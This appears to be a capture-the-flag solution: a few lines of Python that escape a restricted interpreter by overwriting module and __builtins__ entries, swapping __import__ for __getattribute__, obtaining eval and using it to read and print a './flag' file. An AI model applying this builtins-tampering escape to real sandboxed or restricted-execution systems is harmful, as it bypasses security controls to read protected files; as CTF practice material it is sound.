from structs import __dict__, __builtins__, __getattribute__

__dict__["structs"] = __builtins__
__builtins__['__import__'] = __getattribute__

from structs import get

a = get("eval")
a('print(open("./flag").read())')
